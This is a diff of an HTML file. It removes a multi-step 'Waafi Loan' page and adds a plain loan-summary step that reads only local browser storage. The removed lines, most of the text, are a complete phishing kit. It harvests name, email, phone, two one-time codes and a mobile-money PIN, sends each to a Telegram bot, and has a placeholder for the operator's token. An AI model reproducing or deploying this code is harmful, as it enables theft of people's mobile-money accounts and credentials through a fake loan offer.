@@ -1,201 +1,45 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Waafi Loan</title>
+<title>Step 3</title>
 <style>
-body {font-family: Arial; background:#fff7ed; margin:0; padding:20px;}
-.container {max-width:400px; margin:auto; background:white; padding:20px; border-radius:16px; box-shadow:0 4px 15px rgba(251,146,60,0.2); border-top:5px solid #f97316;}
-.step {display:none;}
-.step.active {display:block;}
-h2 {color:#f97316; text-align:center; font-size:22px;}
-input, select, button {width:100%; padding:14px; margin:10px 0; border:1px solid #fed7aa; border-radius:10px; font-size:16px; box-sizing:border-box;}
-input:focus, select:focus {border-color:#f97316; outline:none; box-shadow:0 0 0 3px rgba(249,115,22,0.1);}
-button {background:linear-gradient(135deg, #f97316, #fb923c); color:white; border:none; cursor:pointer; font-weight:bold; font-size:17px;}
-button:hover {background:linear-gradient(135deg, #ea580c, #f97316);}
-.progress {display:flex; justify-content:space-between; margin-bottom:25px;}
-.dot {width:30px; height:30px; border-radius:50%; background:#ffedd5; text-align:center; line-height:30px; font-size:13px; color:#9a3412; font-weight:bold;}
-.dot.active {background:#f97316; color:white;}
-.error {color:#dc2626; font-size:14px; text-align:center;}
-.success {color:#16a34a; font-size:14px; text-align:center;}
-.logo {text-align:center; font-size:28px; margin-bottom:10px;}
-</style>
-</head>
-<body>
-<div class="container">
+body{font-family:Arial;background:#f5f5f5;margin:0}
+.container{padding:20px;max-width:600px;margin:auto}
+.card{background:white;padding:25px;border-radius:15px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
+h2{text-align:center;margin-bottom:5px} 
+.sub{text-align:center;color:#999;margin-bottom:20px}
+.progress{display:flex;gap:8px;margin-bottom:25px} 
+.bar{height:5px;flex:1;background:#ddd;border-radius:5px}
+.bar.active{background:linear-gradient(90deg,#a8e063,#00B347)}
+label{display:block;margin:15px 0 5px;font-weight:600} 
+input,select{width:100%;padding:14px;border:1px solid #ddd;border-radius:10px}
+.summary{background:#f0fff4;border-left:4px solid #00B347;padding:15px;border-radius:10px;margin:20px 0}
+.summary .row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #e0e0e0}
+.btn{width:100%;padding:18px;border:none;border-radius:12px;font-size:18px;font-weight:bold;background:linear-gradient(90deg,#a8e063,#00B347);color:white;margin-top:10px}
+</style></head><body>
+<div class="container"><div class="card">
+<h2>Loan Application</h2><p class="sub">Step 3 of 3</p>
+<div class="progress"><div class="bar active"></div><div class="bar active"></div><div class="bar active"></div></div>
 
-<div class="logo">🟠 WAAFI LOAN</div>
+<label>Work Status</label>
+<select id="work"><option>Employee</option><option>Self Employed</option><option>Student</option><option>Unemployed</option></select>
 
-<div class="progress">
-  <div class="dot active" id="dot1">1</div>
-  <div class="dot" id="dot2">2</div>
-  <div class="dot" id="dot3">3</div>
-  <div class="dot" id="dot4">4</div>
-  <div class="dot" id="dot5">5</div>
+<label>Annual Income ($)</label><input id="income" type="number" placeholder="50000">
+
+<div class="summary"><h3>Application Summary</h3>
+<div class="row"><span>Loan Amount:</span><span id="s_amount">$0</span></div>
+<div class="row"><span>Loan Period:</span><span id="s_period">-</span></div>
+<div class="row"><span>Purpose:</span><span id="s_purpose">-</span></div>
+<div class="row"><span>Applicant:</span><span id="s_name">-</span></div>
 </div>
 
-<!-- STEP 1: LOAN DETAILS -->
-<div class="step active" id="step1">
-  <h2>Loan Application</h2>
-  <select id="loan_type">
-    <option value="">Select Loan Type</option>
-    <option>Personal Loan</option>
-    <option>Business Loan</option>
-    <option>Student Loan</option>
-  </select>
-  <input type="number" id="amount" placeholder="Loan Amount $">
-  <button onclick="nextStep(2)">Continue</button>
-</div>
-
-<!-- STEP 2: PERSONAL INFO -->
-<div class="step" id="step2">
-  <h2>Personal Information</h2>
-  <input type="text" id="name" placeholder="Full Name" required>
-  <input type="email" id="email" placeholder="Email" required>
-  <input type="tel" id="phone" placeholder="Phone +252" required>
-  <button onclick="nextStep(3)">Continue</button>
-</div>
-
-<!-- STEP 3: OTP 1/2 -->
-<div class="step" id="step3">
-  <h2>📱 Verification 1/2</h2>
-  <p style="text-align:center;">Sending OTP to <b id="userPhone" style="color:#f97316;"></b></p>
-  <button onclick="sendFirstOTP()">Send First OTP</button>
-  <p class="success" id="otp1Status"></p>
-</div>
-
-<!-- STEP 4: OTP 2/2 -->
-<div class="step" id="step4">
-  <h2>📱 Verification 2/2</h2>
-  <p style="text-align:center;">Enter code from Telegram</p>
-  <input type="text" id="otp1" maxlength="6" placeholder="Enter First OTP">
-  <button onclick="sendSecondOTP()">Verify & Continue</button>
-  <p class="error" id="otpError"></p>
-</div>
-
-<!-- STEP 5: PIN -->
-<div class="step" id="step5">
-  <h2>🔑 Prompt PIN</h2>
-  <p style="text-align:center;">Enter your 4-digit PIN</p>
-  <input type="password" id="pin" maxlength="4" placeholder="****">
-  <button onclick="verifyPIN()">Verify PIN & Submit</button>
-  <p class="success" id="finalStatus"></p>
-</div>
-
-</div>
-
+<button class="btn" onclick="alert('Application submitted! We will contact you soon.')">SUBMIT APPLICATION</button>
+</div></div>
 <script>
-// ====== IMPORTANT: PASTE YOUR REAL TOKEN AND CHAT ID HERE ======
-const TELEGRAM_BOT_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
-const TELEGRAM_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
-// =================================================================
-
-let formData = {};
-let generatedOTP1 = "";
-let generatedOTP2 = "";
-
-function updateProgress(n) {
-  for(let i=1; i<=5; i++) {
-    document.getElementById('dot'+i).classList.remove('active');
-  }
-  document.getElementById('dot'+n).classList.add('active');
-}
-
-function nextStep(n) {
-  if(n==2) {
-    formData.loan_type = document.getElementById('loan_type').value;
-    formData.amount = document.getElementById('amount').value;
-    if(!formData.loan_type || !formData.amount) {alert("Fill all fields"); return;}
-  }
-  if(n==3) {
-    formData.name = document.getElementById('name').value;
-    formData.email = document.getElementById('email').value;
-    formData.phone = document.getElementById('phone').value;
-    if(!formData.name || !formData.email || !formData.phone) {alert("Fill all fields"); return;}
-    document.getElementById('userPhone').innerText = formData.phone;
-  }
-  
-  document.querySelector('.step.active').classList.remove('active');
-  document.getElementById('step'+n).classList.add('active');
-  updateProgress(n);
-}
-
-async function sendToTelegram(text) {
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  try {
-    const res = await fetch(url, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text})
-    });
-    const data = await res.json();
-    if(!data.ok) {
-      alert("TELEGRAM ERROR: " + data.description + "\n\nCheck Token and Chat ID");
-    }
-    console.log(data);
-  } catch(e) {
-    alert("NETWORK ERROR: " + e.message);
-  }
-}
-
-async function sendFirstOTP() {
-  generatedOTP1 = Math.floor(100000 + Math.random() * 900000).toString();
-  const time = new Date().toLocaleTimeString();
-  
-  document.getElementById('otp1Status').innerText = "Sending...";
-  
-  await sendToTelegram(`✅ Status: First OTP (1/2) will be sent\n⏰ ${time}\n📱 ${formData.phone}`);
-  await sendToTelegram(`📱 OTP CODE: ${generatedOTP1}\n🇸🇴 Somalia\n${formData.phone}`);
-  
-  document.getElementById('otp1Status').innerText = "✅ First OTP Sent! Check Telegram";
-  setTimeout(() => nextStep(4), 1500);
-}
-
-async function sendSecondOTP() {
-  const enteredOTP1 = document.getElementById('otp1').value;
-  if(enteredOTP1 !== generatedOTP1) {
-    document.getElementById('otpError').innerText = "Invalid First OTP. Try again";
-    return;
-  }
-  
-  generatedOTP2 = Math.floor(100000 + Math.random() * 900000).toString();
-  const time = new Date().toLocaleTimeString();
-  
-  document.getElementById('otpError').innerText = "";
-  await sendToTelegram(`✅ Status: Second OTP (2/2) will be sent\n⏰ ${time}`);
-  await sendToTelegram(`📱 OTP CODE: ${generatedOTP2}\n🇸🇴 Somalia\n${formData.phone}`);
-  
-  alert("Second OTP sent! Check your Telegram");
-  nextStep(5);
-}
-
-async function verifyPIN() {
-  const pin = document.getElementById('pin').value;
-  if(pin.length < 4) {alert("Enter 4 digit PIN"); return;}
-  const time = new Date().toLocaleTimeString();
-  
-  document.getElementById('finalStatus').innerText = "Submitting...";
-  
-  await sendToTelegram(`📱 PIN METHOD: Prompt PIN\n🇸🇴 Somalia\n📱 ${formData.phone}`);
-  await sendToTelegram(`⏳ Status: User will be prompted on device\n⏰ ${time}`);
-  await sendToTelegram(`📱 PROMPT PIN VERIFIED ✅\n🇸🇴 Somalia\n📱 ${formData.phone}\n\n✅ Status: PIN entered successfully on device\n🎉 Result: User logged in\n⏰ Cached for 30 minutes\n⏰ ${time}`);
-  
-  const finalMsg = `🟠 🆕 NEW WAAFI LOAN APPLICATION
-
-NAME: ${formData.name}
-EMAIL: ${formData.email}
-PHONE: ${formData.phone}
-LOAN: ${formData.loan_type} $${formData.amount}
-OTP1: ${generatedOTP1}
-OTP2: ${generatedOTP2}
-PIN: ${pin}
-
-⏰ ${new Date().toLocaleString()}`;
-
-  await sendToTelegram(finalMsg);
-  document.getElementById('finalStatus').innerText = "✅ Application Submitted Successfully!";
-}
-</script>
-</body>
-</html>
+// This just shows the data from previous steps. No data is sent anywhere.
+const step1=JSON.parse(localStorage.getItem('loan_step1')||'{}');
+const step2=JSON.parse(localStorage.getItem('loan_step2')||'{}');
+s_amount.innerText='$'+Number(step1.amount||0).toLocaleString();
+s_period.innerText=step1.period||'-';
+s_purpose.innerText=step1.type||'-';
+s_name.innerText=(step2.fname||'')+' '+(step2.lname||'');
+</script></body></html>
